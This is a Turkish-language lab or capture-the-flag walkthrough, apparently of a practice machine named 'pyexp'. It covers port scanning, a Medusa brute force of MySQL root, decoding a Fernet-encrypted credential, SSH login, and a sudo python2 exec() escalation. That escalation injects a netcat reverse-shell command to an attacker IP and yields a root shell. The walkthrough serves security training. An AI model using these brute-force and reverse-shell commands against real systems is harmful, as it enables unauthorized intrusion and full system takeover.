@@ -1,0 +1,120 @@
+      ####enumeration
+
+Nmap
+İlk 5000 TCP bağlantı noktasına karşı bir tarama yaparak başlıyoruz :
+kali@kali:~$ sudo nmap $targetip --top-ports=5000
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-19 12:28 EST
+Nmap scan report for $targetip
+Host is up (0.038s latency).
+Not shown: 4998 closed ports
+PORT     STATE SERVICE
+1337/tcp open  waste
+3306/tcp open  mysql
+3306 numaralı bağlantı noktasında olası bir MySQL hizmeti görüyoruz. Ancak 1337 numaralı bağlantı noktası da ilginç görünüyor. Servis sürümü bilgisi için tarayalım:
+kali@kali:~$ sudo nmap -p 1337 $targetip -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-19 13:27 EST
+Nmap scan report for $targetip
+Host is up (0.031s latency).
+
+PORT     STATE SERVICE VERSION
+1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Sahip olduğumuz şey bir SSH hizmetidir. Gelecekte başvurmak için bunu hatırlayacağız.
+
+      ####exploitation
+
+MySQL Kimlik Bilgileri Bruteforce
+:root Kullanıcısı için MySQL şifresini kaba kuvvete zorlamak için Medusa aracını rockyou.txt wordlist ile kullanmayı deneyeceğiz 
+kali@kali:~$ medusa -h $targetip -M mysql -u root -P /usr/share/wordlists/rockyou.txt -t 40 -v 4 -f
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT FOUND: [mysql] Host: $targetip User: root Password: $passwordcensored [SUCCESS]
+Araç, şifreyi kısa bir sürede buluyor.
+
+      ####MySQL Veritabanı Numaralandırma
+Kurtarılan kimlik bilgileriyle artık veritabanı sunucusuna root:$passwordcensored.
+kali@kali:~$ mysql -u root -p $passwordcensored -h $targetip
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 10063
+Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+Giriş yaptıktan sonra, bize sunulan veritabanlarının listesini sıralayacağız. Bunlar arasında veritabanı databulunur:
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| data               |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.036 sec)
+Bu veritabanını kullanacağız ve ardından içindeki mevcut tabloları listeleyeceğiz:
+MariaDB [(none)]> USE data;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [data]> SHOW TABLES;
++----------------+
+| Tables_in_data |
++----------------+
+| fernet         |
++----------------+
+1 row in set (0.032 sec)
+Bu, adlı mevcut tek tabloyu gösterir fernet. İçeriğini boşaltacağız:
+MariaDB [data]> SELECT * FROM fernet;
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
+| cred                                                                                                                     | keyy                                         |
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
+| $credcensored                                                                                                            | $keyycensored |
++--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
+1 row in set (0.031 sec)
+Ve içinde iki alan bulunan tek bir kayıt buluyoruz: cred ve keyy. Şimdi... nedir fernet?
+
+İnternette biraz araştırma yaparsak, bunun Fernetbir tür şifreleme algoritması olduğunu görürüz. Bu web sitesi diyor ki:
+Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key. Fernet is an implementation of symmetric (also known as “secret key”) authenticated cryptography. Fernet also has support for 
+implementing key rotation via MultiFernet.
+Fernet decode => Bunu çözen gibi bir web sitesi, bizim için mesajın şifresini kolayca çözecektir:
+lucy:$fernetdecodedpasswordcensored
+
+      ####SSH
+lucy kullanıcı adında aşağıdaki şifreye sahip bir kullanıcı var gibi görünüyor :
+$fernetdecodedpasswordcensored
+Bunu SSH üzerinden teyit edebiliriz (bu sistemdeki SSH portunun 1337 olduğunu hatırlayarak):
+kali@kali:~$ ssh -o StrictHostKeyChecking=no -p 1337 lucy@$targetip
+Warning: Permanently added '[$targetip]:1337' (ECDSA) to the list of known hosts.
+lucy@$targetip's password: 
+...
+lucy@pyexp:~$ id
+uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+      ####Sudo Numaralandırma
+Yükseltilmiş ayrıcalıklarla çalıştırabileceğimiz komutları numaralandırmak bizi /usr/bin/python2 konumuna götürür , ancak yalnızca /opt/exp.py üzerinde çalıştırılabilir :
+lucy@pyexp:~$ sudo -l
+Matching Defaults entries for lucy on pyexp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucy may run the following commands on pyexp:
+    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
+/opt/exp.py içeriğini inceleyeceğiz :
+lucy@pyexp:~$ cat /opt/exp.py
+uinput = raw_input('how are you?')
+exec(uinput)
+Bu program, saldırganın sağladığı her türlü girişi yürütür. Bu işlevi kolayca kötüye kullanabiliriz. İlk olarak netcat 4444 portuna bir dinleyici kuracağız. Ardından bu programı şu şekilde kötüye kullanacağız (IP adresini değiştirdiğinizden emin olun):
+lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py
+how are you?__import__('os').system('nc $attackerip 4444 -e /bin/bash'); 
+
+Şimdi netcat dinleyicimize geri dönersek, bir kök kabuğu elde ettik:
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 37210
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@pyexp:/home/lucy# whoami
+root                                    
